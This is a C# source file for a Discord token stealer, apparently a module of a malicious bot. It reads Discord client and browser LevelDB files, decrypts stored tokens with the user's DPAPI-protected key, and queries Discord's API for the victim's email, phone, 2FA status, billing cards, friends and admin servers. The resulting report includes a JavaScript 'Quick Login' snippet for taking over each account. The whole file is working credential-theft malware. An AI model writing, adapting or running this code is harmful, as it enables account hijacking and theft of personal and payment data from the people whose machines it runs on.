using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;
using System.Linq;
using System.Security.Cryptography;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;

namespace FinalBot.Stealers
{
    public class DiscordStealer
    {
        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        private readonly string[] _tokenRegexes = {
            @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
            @"mfa\.[\w-]{84}",
            @"dQw4w9WgXcQ:[^"" ]{60,160}"
        };

        public async Task<string> Run()
        {
            var tokens = new HashSet<string>();
            var paths = new Dictionary<string, string>
            {
                {"Discord", Path.Combine(_appData, "discord")},
                {"Discord Canary", Path.Combine(_appData, "discordcanary")},
                {"Discord PTB", Path.Combine(_appData, "discordptb")},
                {"Chrome", Path.Combine(_localAppData, "Google\\Chrome\\User Data\\Default")},
                {"Edge", Path.Combine(_localAppData, "Microsoft\\Edge\\User Data\\Default")},
                {"Brave", Path.Combine(_localAppData, "BraveSoftware\\Brave-Browser\\User Data\\Default")},
                {"Opera", Path.Combine(_appData, "Opera Software\\Opera Stable")},
                {"Opera GX", Path.Combine(_appData, "Opera Software\\Opera GX Stable")}
            };

            foreach (var path in paths)
            {
                if (Directory.Exists(path.Value))
                {
                    try 
                    {
                        var found = await ScanPath(path.Key, path.Value);
                        foreach (var t in found) tokens.Add(t);
                    }
                    catch { }
                }
            }

            if (tokens.Count == 0) return "❌ No Discord tokens found.";

            var report = new StringBuilder();
            report.AppendLine("💎 ✨ <b>DISCORD ANALYSIS REPORT</b> ✨ 💎");
            report.AppendLine("🌐 <i>Scanning native modules and leveldb...</i>");
            
            using (var client = new HttpClient())
            {
                foreach (var token in tokens)
                {
                    report.AppendLine("\n📡 " + $"<code>{token}</code>");
                    
                    // Quick Login Script
                    string quickLogin = "<code>" + 
                                       WebUtility.HtmlEncode("(function(token){try{window.webpackChunkdiscord_app.push([[Symbol()],{},e=>{for(let r of Object.values(e.c)){if(r.exports?.default?.updateToken){r.exports.default.updateToken(token);break;}}}}])}catch(e){}try{window.localStorage.setItem('token', '\"' + token + '\"');}catch(e){}setTimeout(()=>{location.reload()},500);})('") + token + WebUtility.HtmlEncode("')") +
                                       "</code>";
                    report.AppendLine("💠 <b>Quick Login:</b>\n" + quickLogin);

                    var info = await GetAccountInfo(client, token);
                    if (info != null)
                    {
                        string user = WebUtility.HtmlEncode(info["username"]?.ToString() ?? "Unknown");
                        report.AppendLine($"👤 <b>User:</b> <code>{user}</code>");
                        report.AppendLine($"🆔 <b>ID:</b> <code>{info["id"]}</code>");
                        report.AppendLine($"📧 <b>Email:</b> <code>{WebUtility.HtmlEncode(info["email"]?.ToString() ?? "N/A")}</code> ✅");
                        report.AppendLine($"📱 <b>Phone:</b> <code>{WebUtility.HtmlEncode(info["phone"]?.ToString() ?? "N/A")}</code>");
                        report.AppendLine($"🛡 <b>2FA:</b> <code>{(info["mfa_enabled"]?.ToString() == "True" ? "🟢 On" : "🔴 Off")}</code>");

                        string nitro = (int)(info["premium_type"] ?? 0) switch
                        {
                            1 => "Nitro Classic",
                            2 => "Nitro",
                            3 => "Nitro Basic",
                            _ => "None"
                        };
                        report.AppendLine($"💎 <b>Nitro:</b> <code>{nitro}</code>");
                        report.AppendLine($"👥 <b>Friends:</b> <code>{info["friends_count"]}</code>");

                        if (info["billing_info"] is JArray cards && cards.Count > 0)
                        {
                            report.AppendLine($"\n💳 <b>Billing ({cards.Count}):</b>");
                            foreach (var card in cards)
                            {
                                string type = card["type"]?.ToString() == "1" ? "💳 Card" : "💰 Paypal";
                                string brand = card["brand"]?.ToString() ?? "N/A";
                                string last4 = card["last_4"]?.ToString() ?? "****";
                                report.AppendLine($"   {type} {brand} <b>{last4}</b>");
                            }
                        }
                        else
                        {
                            report.AppendLine("\n💳 <b>Billing:</b> ❌ No cards");
                        }

                        if (info["admin_guilds"] is JArray guilds && guilds.Count > 0)
                        {
                            report.AppendLine($"🏰 <b>Admin Servers ({guilds.Count}):</b>");
                            foreach(var g in guilds.Take(5))
                                report.AppendLine($"   • 🛡️ {WebUtility.HtmlEncode(g["name"]?.ToString() ?? "Unknown")}");
                        }
                    }
                    else
                    {
                        report.AppendLine("⚠️ <b>Invalid/Expired Token</b>");
                    }
                    report.AppendLine("——————————————————————————————");
                }
            }
            return report.ToString();
        }

        private async Task<JObject> GetAccountInfo(HttpClient client, string token)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me");
                request.Headers.Authorization = new AuthenticationHeaderValue(token);
                var response = await client.SendAsync(request);
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    var user = JObject.Parse(content);
                    
                    // 1. Check billing
                    var billingReq = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me/billing/payment-sources");
                    billingReq.Headers.Authorization = new AuthenticationHeaderValue(token);
                    var billingResp = await client.SendAsync(billingReq);
                    if (billingResp.IsSuccessStatusCode)
                    {
                        user["billing_info"] = JArray.Parse(await billingResp.Content.ReadAsStringAsync());
                    }
                    
                    // 2. Check friends (relationships)
                    var friendsReq = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me/relationships");
                    friendsReq.Headers.Authorization = new AuthenticationHeaderValue(token);
                    var friendsResp = await client.SendAsync(friendsReq);
                    if (friendsResp.IsSuccessStatusCode)
                    {
                        user["friends_count"] = JArray.Parse(await friendsResp.Content.ReadAsStringAsync()).Count;
                    }

                    // 3. Check guilds (admin status)
                    var guildsReq = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me/guilds");
                    guildsReq.Headers.Authorization = new AuthenticationHeaderValue(token);
                    var guildsResp = await client.SendAsync(guildsReq);
                    if (guildsResp.IsSuccessStatusCode)
                    {
                        var guilds = JArray.Parse(await guildsResp.Content.ReadAsStringAsync());
                        var adminGuilds = new JArray();
                        foreach(var g in guilds)
                        {
                            long permissions = long.Parse(g["permissions"]?.ToString() ?? "0");
                            // Administrator permission is bit 3 (0x8)
                            if ((permissions & 0x8) == 0x8)
                            {
                                adminGuilds.Add(g);
                            }
                        }
                        user["admin_guilds"] = adminGuilds;
                    }
                    
                    return user;
                }
            }
            catch { }
            return null;
        }

        private async Task<List<string>> ScanPath(string service, string rootPath)
        {
            var results = new List<string>();
            string levelDbPath = Path.Combine(rootPath, "Local Storage", "leveldb");
            if (!Directory.Exists(levelDbPath)) return results;

            byte[] masterKey = null;
            if (service.Contains("Discord"))
            {
                masterKey = GetDiscordMasterKey(rootPath);
            }

            foreach (var file in Directory.GetFiles(levelDbPath, "*.ldb").Concat(Directory.GetFiles(levelDbPath, "*.log")))
            {
                try 
                {
                    string content = File.ReadAllText(file, Encoding.UTF8);
                    foreach (var regex in _tokenRegexes)
                    {
                        foreach (Match match in Regex.Matches(content, regex))
                        {
                            string token = match.Value;
                            if (token.StartsWith("dQw4w9WgXcQ:"))
                            {
                                if (masterKey != null)
                                {
                                    string decrypted = DecryptDiscordToken(token, masterKey);
                                    if (!string.IsNullOrEmpty(decrypted)) results.Add(decrypted);
                                }
                            }
                            else 
                            {
                                results.Add(token);
                            }
                        }
                    }
                }
                catch { }
            }

            return results.Distinct().ToList();
        }

        private byte[] GetDiscordMasterKey(string rootPath)
        {
            string stateFile = Path.Combine(rootPath, "Local State");
            if (!File.Exists(stateFile)) return null;

            try 
            {
                string content = File.ReadAllText(stateFile);
                var json = JObject.Parse(content);
                string encryptedKey = json["os_crypt"]?["encrypted_key"]?.ToString();
                if (string.IsNullOrEmpty(encryptedKey)) return null;

                byte[] keyWithPrefix = Convert.FromBase64String(encryptedKey);
                byte[] key = keyWithPrefix.Skip(5).ToArray();

                return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
            }
            catch { return null; }
        }

        private string DecryptDiscordToken(string encryptedToken, byte[] key)
        {
            try 
            {
                byte[] data = Convert.FromBase64String(encryptedToken.Split(':')[1]);
                byte[] iv = data.Skip(3).Take(12).ToArray();
                byte[] payload = data.Skip(15).ToArray();

                using (var aes = new AesGcm(key, 16))
                {
                    byte[] tag = payload.TakeLast(16).ToArray();
                    byte[] ciphertext = payload.SkipLast(16).ToArray();
                    byte[] plaintext = new byte[ciphertext.Length];

                    aes.Decrypt(iv, ciphertext, tag, plaintext);
                    return Encoding.UTF8.GetString(plaintext);
                }
            }
            catch { return null; }
        }
    }
}
